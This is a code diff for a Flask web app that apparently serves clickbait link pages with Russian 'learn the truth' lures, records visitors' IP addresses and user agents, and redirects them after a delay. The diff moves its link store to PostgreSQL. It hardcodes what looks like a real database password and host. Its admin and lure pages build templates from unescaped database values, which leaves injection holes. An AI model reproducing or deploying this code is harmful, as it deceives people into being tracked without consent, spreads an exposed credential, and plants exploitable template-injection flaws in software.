@@ -3,7 +3,7 @@ import base64
 import httpagentparser
 import requests
 import random
-import sqlite3
+import psycopg2
 from flask import Flask, request, render_template_string, jsonify, g, session, redirect, url_for
 from dotenv import load_dotenv
 from functools import wraps
@@ -197,8 +197,13 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
 def get_db():
     if 'db' not in g:
-        g.db = sqlite3.connect('/tmp/links.db')  # Используем временную директорию
-        g.db.row_factory = sqlite3.Row
+        g.db = psycopg2.connect(
+            dbname="railway",
+            user="postgres",
+            password="ARqhUZuObMCvMaLssOOOVpbkQmkFqjwk",
+            host="junction.proxy.rlwy.net",
+            port="32594"
+        )
     return g.db
 
 @app.teardown_appcontext
@@ -208,35 +213,43 @@ def close_db(e=None):
         db.close()
 
 def init_db():
-    with app.app_context():
-        db = get_db()
-        cursor = db.cursor()
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS links (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                path TEXT UNIQUE NOT NULL,
-                title TEXT NOT NULL,
-                description TEXT NOT NULL,
-                image_url TEXT NOT NULL,
-                redirect_url TEXT NOT NULL,
-                redirect_delay INTEGER DEFAULT 5,
-                click_count INTEGER DEFAULT 0
-            )
-        ''')
-        existing = cursor.execute('SELECT COUNT(*) FROM links').fetchone()[0]
-        if existing == 0:
+    try:
+        with app.app_context():
+            db = get_db()
+            cursor = db.cursor()
             cursor.execute('''
-                INSERT INTO links (path, title, description, image_url, redirect_url, redirect_delay)
-                VALUES (?, ?, ?, ?, ?, ?)
-            ''', (
-                'XzAc24',
-                CLICKBAIT_TITLE,
-                CLICKBAIT_DESCRIPTION,
-                CLICKBAIT_IMAGE,
-                REAL_URL,
-                REDIRECT_DELAY
-            ))
-        db.commit()
+                CREATE TABLE IF NOT EXISTS links (
+                    id SERIAL PRIMARY KEY,
+                    path TEXT UNIQUE NOT NULL,
+                    title TEXT NOT NULL,
+                    description TEXT NOT NULL,
+                    image_url TEXT NOT NULL,
+                    redirect_url TEXT NOT NULL,
+                    redirect_delay INTEGER DEFAULT 5,
+                    click_count INTEGER DEFAULT 0
+                )
+            ''')
+            db.commit()  # Commit the table creation
+
+            # Check if the table exists and has rows
+            cursor.execute('SELECT COUNT(*) FROM links')
+            existing = cursor.fetchone()
+            if existing is not None and existing[0] == 0:
+                cursor.execute('''
+                    INSERT INTO links (path, title, description, image_url, redirect_url, redirect_delay)
+                    VALUES (%s, %s, %s, %s, %s, %s)
+                ''', (
+                    'XzAc24',
+                    CLICKBAIT_TITLE,
+                    CLICKBAIT_DESCRIPTION,
+                    CLICKBAIT_IMAGE,
+                    REAL_URL,
+                    REDIRECT_DELAY
+                ))
+                db.commit()  # Commit the insertion
+
+    except Exception as e:
+        logging.error(f"Database initialization error: {e}")
 
 # Инициализация БД при запуске
 init_db()
@@ -274,17 +287,19 @@ def admin_logout():
 @login_required
 def admin_dashboard():
     db = get_db()
-    links = db.execute('SELECT * FROM links').fetchall()
+    cursor = db.cursor()
+    cursor.execute('SELECT * FROM links')
+    links = cursor.fetchall()
     links_html = "<table><tr><th>Path</th><th>Title</th><th>Clicks</th><th>Actions</th></tr>"
     for link in links:
         links_html += f"""
         <tr>
-            <td>{link['path']}</td>
-            <td>{link['title']}</td>
-            <td>{link['click_count']}</td>
+            <td>{link[1]}</td>
+            <td>{link[2]}</td>
+            <td>{link[7]}</td>
             <td>
-                <a href="/admin/links/{link['id']}/edit">Edit</a>
-                <form method="POST" action="/admin/links/{link['id']}/delete">
+                <a href="/admin/links/{link[0]}/edit">Edit</a>
+                <form method="POST" action="/admin/links/{link[0]}/delete">
                     <button type="submit">Delete</button>
                 </form>
             </td>
@@ -305,7 +320,7 @@ def new_link():
         cursor = db.cursor()
         cursor.execute('''
             INSERT INTO links (path, title, description, image_url, redirect_url, redirect_delay)
-            VALUES (?, ?, ?, ?, ?, ?)
+            VALUES (%s, %s, %s, %s, %s, %s)
         ''', (
             request.form['path'],
             request.form['title'],
@@ -332,12 +347,13 @@ def new_link():
 @login_required
 def edit_link(id):
     db = get_db()
-    link = db.execute('SELECT * FROM links WHERE id = ?', (id,)).fetchone()
+    cursor = db.cursor()
+    cursor.execute('SELECT * FROM links WHERE id = %s', (id,))
+    link = cursor.fetchone()
     if request.method == 'POST':
-        cursor = db.cursor()
         cursor.execute('''
-            UPDATE links SET path = ?, title = ?, description = ?, image_url = ?, redirect_url = ?, redirect_delay = ?
-            WHERE id = ?
+            UPDATE links SET path = %s, title = %s, description = %s, image_url = %s, redirect_url = %s, redirect_delay = %s
+            WHERE id = %s
         ''', (
             request.form['path'],
             request.form['title'],
@@ -351,12 +367,12 @@ def edit_link(id):
         return redirect(url_for('admin_dashboard'))
     return render_template_string(f'''
         <form method="post">
-            Path: <input type="text" name="path" value="{link['path']}"><br>
-            Title: <input type="text" name="title" value="{link['title']}"><br>
-            Description: <input type="text" name="description" value="{link['description']}"><br>
-            Image URL: <input type="text" name="image_url" value="{link['image_url']}"><br>
-            Redirect URL: <input type="text" name="redirect_url" value="{link['redirect_url']}"><br>
-            Redirect Delay: <input type="number" name="redirect_delay" value="{link['redirect_delay']}"><br>
+            Path: <input type="text" name="path" value="{link[1]}"><br>
+            Title: <input type="text" name="title" value="{link[2]}"><br>
+            Description: <input type="text" name="description" value="{link[3]}"><br>
+            Image URL: <input type="text" name="image_url" value="{link[4]}"><br>
+            Redirect URL: <input type="text" name="redirect_url" value="{link[5]}"><br>
+            Redirect Delay: <input type="number" name="redirect_delay" value="{link[6]}"><br>
             <input type="submit" value="Update">
         </form>
     ''')
@@ -366,7 +382,7 @@ def edit_link(id):
 def delete_link(id):
     db = get_db()
     cursor = db.cursor()
-    cursor.execute('DELETE FROM links WHERE id = ?', (id,))
+    cursor.execute('DELETE FROM links WHERE id = %s', (id,))
     db.commit()
     return redirect(url_for('admin_dashboard'))
 
@@ -429,11 +445,13 @@ def home():
 def handle_custom_link(custom_path):
     try:
         db = get_db()
-        link = db.execute('SELECT * FROM links WHERE path = ?', (custom_path,)).fetchone()
+        cursor = db.cursor()
+        cursor.execute('SELECT * FROM links WHERE path = %s', (custom_path,))
+        link = cursor.fetchone()
         if link is None:
             return "Ссылка не найдена", 404
 
-        db.execute('UPDATE links SET click_count = click_count + 1 WHERE id = ?', (link['id'],))
+        cursor.execute('UPDATE links SET click_count = click_count + 1 WHERE id = %s', (link[0],))
         db.commit()
 
         user_ip = request.remote_addr
@@ -445,18 +463,18 @@ def handle_custom_link(custom_path):
         <html lang="ru">
         <head>
             <meta charset="UTF-8">
-            <title>{link['title']}</title>
+            <title>{link[2]}</title>
             <!-- Open Graph Meta Tags -->
-            <meta property="og:title" content="{link['title']}">
-            <meta property="og:description" content="{link['description']}">
-            <meta property="og:image" content="{link['image_url']}">
+            <meta property="og:title" content="{link[2]}">
+            <meta property="og:description" content="{link[3]}">
+            <meta property="og:image" content="{link[4]}">
             <meta property="og:url" content="{request.url}">
             <meta property="og:type" content="website">
             <!-- Twitter Cards -->
             <meta name="twitter:card" content="summary_large_image">
-            <meta name="twitter:title" content="{link['title']}">
-            <meta name="twitter:description" content="{link['description']}">
-            <meta name="twitter:image" content="{link['image_url']}">
+            <meta name="twitter:title" content="{link[2]}">
+            <meta name="twitter:description" content="{link[3]}">
+            <meta name="twitter:image" content="{link[4]}">
             <style>
                 body {{
                     font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -515,15 +533,15 @@ def handle_custom_link(custom_path):
             </style>
             <script>
                 setTimeout(function() {{
-                    window.location.href = "{link['redirect_url']}";
-                }}, {link['redirect_delay'] * 1000});
+                    window.location.href = "{link[5]}";
+                }}, {link[6] * 1000});
             </script>
         </head>
         <body>
-            <h1>{link['title']}</h1>
-            <p>Ты в шоке? 😱 Через {link['redirect_delay']} секунд ты узнаешь правду!</p>
+            <h1>{link[2]}</h1>
+            <p>Ты в шоке? 😱 Через {link[6]} секунд ты узнаешь правду!</p>
             <div class="spinner"></div>
-            <button class="button" onclick="window.location.href='{link['redirect_url']}'">Узнать правду</button>
+            <button class="button" onclick="window.location.href='{link[5]}'">Узнать правду</button>
         </body>
         </html>
         """
